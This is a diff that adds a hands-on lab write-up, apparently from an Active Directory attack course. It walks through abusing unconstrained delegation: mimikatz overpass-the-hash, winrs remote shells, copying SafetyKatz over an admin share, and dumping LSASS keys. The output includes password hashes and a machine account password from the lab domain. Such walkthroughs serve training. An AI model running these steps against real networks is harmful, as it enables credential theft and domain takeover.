@@ -5,3 +5,394 @@ Find a server in US domain where Unconstrained Delegation is enabled.
 Compromise that server and get Domain Admin privileges.
 
 ```
+
+## Index of content
+  1. [Untrusted Delegation](#untrusted-delegation)
+  2. [Compromise Server](#compromise-server)
+
+
+## Untrusted Delegation
+
+Detected unconstrained trusted delegation:
+```
+Get-ADComputer -Filter {TrustedForDelegation -eq $True}
+
+DistinguishedName : CN=US-DC,OU=Domain Controllers,DC=us,DC=techcorp,DC=local
+DNSHostName       : US-DC.us.techcorp.local
+Enabled           : True
+Name              : US-DC
+ObjectClass       : computer
+ObjectGUID        : 2edf59cf-aa6e-448a-9810-7a81a3d3af16
+SamAccountName    : US-DC$
+SID               : S-1-5-21-210670787-2521448726-163245708-1000
+UserPrincipalName :
+
+DistinguishedName : CN=US-WEB,CN=Computers,DC=us,DC=techcorp,DC=local
+DNSHostName       : US-Web.us.techcorp.local
+Enabled           : True
+Name              : US-WEB
+ObjectClass       : computer
+ObjectGUID        : cb00dc1e-3619-4187-a02b-42f9c964a637
+SamAccountName    : US-WEB$
+SID               : S-1-5-21-210670787-2521448726-163245708-1110
+UserPrincipalName :
+```
+ReUse credentials for user webmaster on extracted on the previous hands-on, and obtain TGS ticket with pass the hash technique:
+
+```
+C:\Windows\system32>C:\AD\Tools\mimikatz.exe
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 16:49:51
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz # sekurlsa::opassth /user:webmaster /domain:us.techcorp.local /aes256:2a653f166761226eb2e939218f5a34d3d2af005a91f160540da6e4a5e29de8a0 /run:cmd.exe
+user    : webmaster
+domain  : us.techcorp.local
+program : cmd.exe
+impers. : no
+AES256  : 2a653f166761226eb2e939218f5a34d3d2af005a91f160540da6e4a5e29de8a0
+  |  PID  1328
+  |  TID  3908
+  |  LSA Process is now R/W
+  |  LUID 0 ; 5623009 (00000000:0055cce1)
+  \_ msv1_0   - data copy @ 0000028B2F3AAE10 : OK !
+  \_ kerberos - data copy @ 0000028B2F5480A8
+   \_ aes256_hmac       OK
+   \_ aes128_hmac       -> null
+   \_ rc4_hmac_nt       -> null
+   \_ rc4_hmac_old      -> null
+   \_ rc4_md4           -> null
+   \_ rc4_hmac_nt_exp   -> null
+   \_ rc4_hmac_old_exp  -> null
+   \_ *Password replace @ 0000028B2F4C9CD8 (32) -> null
+
+mimikatz #
+
+```
+New cmd qith privilege access to US-webmaster computer:
+
+```
+C:\Windows\system32>whoami /all
+
+USER INFORMATION
+----------------
+
+User Name        SID
+================ =============================================
+us\studentuser17 S-1-5-21-210670787-2521448726-163245708-16107
+
+ERROR: Unable to get group membership information.
+
+C:\Windows\system32>winrs -r:us-web cmd
+Microsoft Windows [Version 10.0.17763.3650]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Users\webmaster>hostname
+hostname
+US-Web
+
+C:\Users\webmaster>whoami /all
+whoami /all
+
+USER INFORMATION
+----------------
+
+User Name    SID
+============ ============================================
+us\webmaster S-1-5-21-210670787-2521448726-163245708-1140
+
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                 Type             SID          Attributes    
+```
+## Compromise Server
+
+From attacker machine copy SfetyKatz to the US-WEB machine:
+```
+C:\Windows\system32>net use  x: \\us-web\C$\Users\Public
+x: has a remembered connection to \\us-mailmgmt\C$\Users\Administrator. Do you
+want to overwrite the remembered connection? (Y/N) [Y]: Y
+The command completed successfully.
+
+C:\Windows\system32>echo F | xcopy C:\AD\Tools\SafetyKatz.exe x:\SafetyKatz.exe
+Does X:\SafetyKatz.exe specify a file name
+or directory name on the target
+(F = file, D = directory)? F
+C:\AD\Tools\SafetyKatz.exe
+1 File(s) copied
+
+
+```
+
+Access to the target machine and DumpCredentials for lsass process:
+
+```
+C:\Windows\system32>winrs -r:us-web cmd
+Microsoft Windows [Version 10.0.17763.3650]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Users\webmaster>cd C:\Users\Public
+cd C:\Users\Public
+
+C:\Users\Public>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 88AD-6C8B
+
+ Directory of C:\Users\Public
+
+02/18/2023  02:42 PM    <DIR>          .
+02/18/2023  02:42 PM    <DIR>          ..
+05/25/2019  02:22 AM    <DIR>          Documents
+09/14/2018  11:19 PM    <DIR>          Downloads
+11/16/2022  04:28 AM            64,512 Loader.exe
+09/14/2018  11:19 PM    <DIR>          Music
+09/14/2018  11:19 PM    <DIR>          Pictures
+12/23/2022  05:23 PM         1,891,840 SafetyKatz.exe
+09/14/2018  11:19 PM    <DIR>          Videos
+               2 File(s)      1,956,352 bytes
+               7 Dir(s)  15,716,372,480 bytes free
+
+C:\Users\Public>C:\SafetyKatz.exe
+C:\SafetyKatz.exe
+'C:\SafetyKatz.exe' is not recognized as an internal or external command,
+operable program or batch file.
+
+C:\Users\Public>C:\Users\Public\SafetyKatz.exe
+C:\Users\Public\SafetyKatz.exe
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 16:49:51
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz # privilege::debug
+Privilege '20' OK
+
+mimikatz # sekurlsa::keys
+
+Authentication Id : 0 ; 1527221 (00000000:00174db5)
+Session           : RemoteInteractive from 2
+User Name         : webmaster
+Domain            : US
+Logon Server      : US-DC
+Logon Time        : 12/26/2022 3:20:34 AM
+SID               : S-1-5-21-210670787-2521448726-163245708-1140
+
+         * Username : webmaster
+         * Domain   : US.TECHCORP.LOCAL
+         * Password : (null)
+         * Key List :
+           aes256_hmac       2a653f166761226eb2e939218f5a34d3d2af005a91f160540da6e4a5e29de8a0
+           rc4_hmac_nt       23d6458d06b25e463b9666364fb0b29f
+           rc4_hmac_old      23d6458d06b25e463b9666364fb0b29f
+           rc4_md4           23d6458d06b25e463b9666364fb0b29f
+           rc4_hmac_nt_exp   23d6458d06b25e463b9666364fb0b29f
+           rc4_hmac_old_exp  23d6458d06b25e463b9666364fb0b29f
+
+Authentication Id : 0 ; 41874 (00000000:0000a392)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 12/26/2022 2:39:08 AM
+SID               : S-1-5-90-0-1
+
+         * Username : US-WEB$
+         * Domain   : us.techcorp.local
+         * Password : 0I7.p^^to%AE? sq!.[\!lUUaBYiU^Ew-t^^@@&'Sp!ykctIPCm,<n2;rR$*y1ThkKCMjzP 7zmH'V)CTjF9@;R<nU ^Cu^ -STMQ0W_Q]_fA(6?;oUX$%>?
+         * Key List :
+           aes256_hmac       db4ea970941159dc9c1a44805445a6811be17aafedc64dd6972db6bbdce46cf6
+           aes128_hmac       5951e4e276047664615d9d7a6c3d8d4e
+           rc4_hmac_nt       892ca1e8d4343c652646b59b51779929
+           rc4_hmac_old      892ca1e8d4343c652646b59b51779929
+           rc4_md4           892ca1e8d4343c652646b59b51779929
+           rc4_hmac_nt_exp   892ca1e8d4343c652646b59b51779929
+           rc4_hmac_old_exp  892ca1e8d4343c652646b59b51779929
+
+Authentication Id : 0 ; 24519 (00000000:00005fc7)
+Session           : Interactive from 1
+User Name         : UMFD-1
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 12/26/2022 2:39:08 AM
+SID               : S-1-5-96-0-1
+
+         * Username : US-WEB$
+         * Domain   : us.techcorp.local
+         * Password : 0I7.p^^to%AE? sq!.[\!lUUaBYiU^Ew-t^^@@&'Sp!ykctIPCm,<n2;rR$*y1ThkKCMjzP 7zmH'V)CTjF9@;R<nU ^Cu^ -STMQ0W_Q]_fA(6?;oUX$%>?
+         * Key List :
+           aes256_hmac       db4ea970941159dc9c1a44805445a6811be17aafedc64dd6972db6bbdce46cf6
+           aes128_hmac       5951e4e276047664615d9d7a6c3d8d4e
+           rc4_hmac_nt       892ca1e8d4343c652646b59b51779929
+           rc4_hmac_old      892ca1e8d4343c652646b59b51779929
+           rc4_md4           892ca1e8d4343c652646b59b51779929
+           rc4_hmac_nt_exp   892ca1e8d4343c652646b59b51779929
+           rc4_hmac_old_exp  892ca1e8d4343c652646b59b51779929
+
+Authentication Id : 0 ; 24463 (00000000:00005f8f)
+Session           : Interactive from 0
+User Name         : UMFD-0
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 12/26/2022 2:39:08 AM
+SID               : S-1-5-96-0-0
+
+         * Username : US-WEB$
+         * Domain   : us.techcorp.local
+         * Password : 0I7.p^^to%AE? sq!.[\!lUUaBYiU^Ew-t^^@@&'Sp!ykctIPCm,<n2;rR$*y1ThkKCMjzP 7zmH'V)CTjF9@;R<nU ^Cu^ -STMQ0W_Q]_fA(6?;oUX$%>?
+         * Key List :
+           aes256_hmac       db4ea970941159dc9c1a44805445a6811be17aafedc64dd6972db6bbdce46cf6
+           aes128_hmac       5951e4e276047664615d9d7a6c3d8d4e
+           rc4_hmac_nt       892ca1e8d4343c652646b59b51779929
+           rc4_hmac_old      892ca1e8d4343c652646b59b51779929
+           rc4_md4           892ca1e8d4343c652646b59b51779929
+           rc4_hmac_nt_exp   892ca1e8d4343c652646b59b51779929
+           rc4_hmac_old_exp  892ca1e8d4343c652646b59b51779929
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : US-WEB$
+Domain            : US
+Logon Server      : (null)
+Logon Time        : 12/26/2022 2:39:07 AM
+SID               : S-1-5-18
+
+         * Username : us-web$
+         * Domain   : US.TECHCORP.LOCAL
+         * Password : (null)
+         * Key List :
+           aes256_hmac       ff8e1037043ae75457e206470ff99a95f40f1a30ebcf6a877e2a2683b82af07c
+           rc4_hmac_nt       892ca1e8d4343c652646b59b51779929
+           rc4_hmac_old      892ca1e8d4343c652646b59b51779929
+           rc4_md4           892ca1e8d4343c652646b59b51779929
+           rc4_hmac_nt_exp   892ca1e8d4343c652646b59b51779929
+           rc4_hmac_old_exp  892ca1e8d4343c652646b59b51779929
+
+Authentication Id : 0 ; 1527159 (00000000:00174d77)
+Session           : RemoteInteractive from 2
+User Name         : webmaster
+Domain            : US
+Logon Server      : US-DC
+Logon Time        : 12/26/2022 3:20:34 AM
+SID               : S-1-5-21-210670787-2521448726-163245708-1140
+
+         * Username : webmaster
+         * Domain   : US.TECHCORP.LOCAL
+         * Password : (null)
+         * Key List :
+           aes256_hmac       2a653f166761226eb2e939218f5a34d3d2af005a91f160540da6e4a5e29de8a0
+           rc4_hmac_nt       23d6458d06b25e463b9666364fb0b29f
+           rc4_hmac_old      23d6458d06b25e463b9666364fb0b29f
+           rc4_md4           23d6458d06b25e463b9666364fb0b29f
+           rc4_hmac_nt_exp   23d6458d06b25e463b9666364fb0b29f
+           rc4_hmac_old_exp  23d6458d06b25e463b9666364fb0b29f
+
+Authentication Id : 0 ; 1355046 (00000000:0014ad26)
+Session           : Interactive from 2
+User Name         : DWM-2
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 12/26/2022 3:07:45 AM
+SID               : S-1-5-90-0-2
+
+         * Username : US-WEB$
+         * Domain   : us.techcorp.local
+         * Password : 0I7.p^^to%AE? sq!.[\!lUUaBYiU^Ew-t^^@@&'Sp!ykctIPCm,<n2;rR$*y1ThkKCMjzP 7zmH'V)CTjF9@;R<nU ^Cu^ -STMQ0W_Q]_fA(6?;oUX$%>?
+         * Key List :
+           aes256_hmac       db4ea970941159dc9c1a44805445a6811be17aafedc64dd6972db6bbdce46cf6
+           aes128_hmac       5951e4e276047664615d9d7a6c3d8d4e
+           rc4_hmac_nt       892ca1e8d4343c652646b59b51779929
+           rc4_hmac_old      892ca1e8d4343c652646b59b51779929
+           rc4_md4           892ca1e8d4343c652646b59b51779929
+           rc4_hmac_nt_exp   892ca1e8d4343c652646b59b51779929
+           rc4_hmac_old_exp  892ca1e8d4343c652646b59b51779929
+
+Authentication Id : 0 ; 1355022 (00000000:0014ad0e)
+Session           : Interactive from 2
+User Name         : DWM-2
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 12/26/2022 3:07:45 AM
+SID               : S-1-5-90-0-2
+
+         * Username : US-WEB$
+         * Domain   : us.techcorp.local
+         * Password : 0I7.p^^to%AE? sq!.[\!lUUaBYiU^Ew-t^^@@&'Sp!ykctIPCm,<n2;rR$*y1ThkKCMjzP 7zmH'V)CTjF9@;R<nU ^Cu^ -STMQ0W_Q]_fA(6?;oUX$%>?
+         * Key List :
+           aes256_hmac       db4ea970941159dc9c1a44805445a6811be17aafedc64dd6972db6bbdce46cf6
+           aes128_hmac       5951e4e276047664615d9d7a6c3d8d4e
+           rc4_hmac_nt       892ca1e8d4343c652646b59b51779929
+           rc4_hmac_old      892ca1e8d4343c652646b59b51779929
+           rc4_md4           892ca1e8d4343c652646b59b51779929
+           rc4_hmac_nt_exp   892ca1e8d4343c652646b59b51779929
+           rc4_hmac_old_exp  892ca1e8d4343c652646b59b51779929
+
+Authentication Id : 0 ; 1353070 (00000000:0014a56e)
+Session           : Interactive from 2
+User Name         : UMFD-2
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 12/26/2022 3:07:45 AM
+SID               : S-1-5-96-0-2
+
+         * Username : US-WEB$
+         * Domain   : us.techcorp.local
+         * Password : 0I7.p^^to%AE? sq!.[\!lUUaBYiU^Ew-t^^@@&'Sp!ykctIPCm,<n2;rR$*y1ThkKCMjzP 7zmH'V)CTjF9@;R<nU ^Cu^ -STMQ0W_Q]_fA(6?;oUX$%>?
+         * Key List :
+           aes256_hmac       db4ea970941159dc9c1a44805445a6811be17aafedc64dd6972db6bbdce46cf6
+           aes128_hmac       5951e4e276047664615d9d7a6c3d8d4e
+           rc4_hmac_nt       892ca1e8d4343c652646b59b51779929
+           rc4_hmac_old      892ca1e8d4343c652646b59b51779929
+           rc4_md4           892ca1e8d4343c652646b59b51779929
+           rc4_hmac_nt_exp   892ca1e8d4343c652646b59b51779929
+           rc4_hmac_old_exp  892ca1e8d4343c652646b59b51779929
+
+Authentication Id : 0 ; 41892 (00000000:0000a3a4)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 12/26/2022 2:39:08 AM
+SID               : S-1-5-90-0-1
+
+         * Username : US-WEB$
+         * Domain   : us.techcorp.local
+         * Password : 0I7.p^^to%AE? sq!.[\!lUUaBYiU^Ew-t^^@@&'Sp!ykctIPCm,<n2;rR$*y1ThkKCMjzP 7zmH'V)CTjF9@;R<nU ^Cu^ -STMQ0W_Q]_fA(6?;oUX$%>?
+         * Key List :
+           aes256_hmac       db4ea970941159dc9c1a44805445a6811be17aafedc64dd6972db6bbdce46cf6
+           aes128_hmac       5951e4e276047664615d9d7a6c3d8d4e
+           rc4_hmac_nt       892ca1e8d4343c652646b59b51779929
+           rc4_hmac_old      892ca1e8d4343c652646b59b51779929
+           rc4_md4           892ca1e8d4343c652646b59b51779929
+           rc4_hmac_nt_exp   892ca1e8d4343c652646b59b51779929
+           rc4_hmac_old_exp  892ca1e8d4343c652646b59b51779929
+
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0
+User Name         : US-WEB$
+Domain            : US
+Logon Server      : (null)
+Logon Time        : 12/26/2022 2:39:08 AM
+SID               : S-1-5-20
+
+         * Username : us-web$
+         * Domain   : US.TECHCORP.LOCAL
+         * Password : (null)
+         * Key List :
+           aes256_hmac       ff8e1037043ae75457e206470ff99a95f40f1a30ebcf6a877e2a2683b82af07c
+           rc4_hmac_nt       892ca1e8d4343c652646b59b51779929
+           rc4_hmac_old      892ca1e8d4343c652646b59b51779929
+           rc4_md4           892ca1e8d4343c652646b59b51779929
+           rc4_hmac_nt_exp   892ca1e8d4343c652646b59b51779929
+           rc4_hmac_old_exp  892ca1e8d4343c652646b59b51779929
+
+```
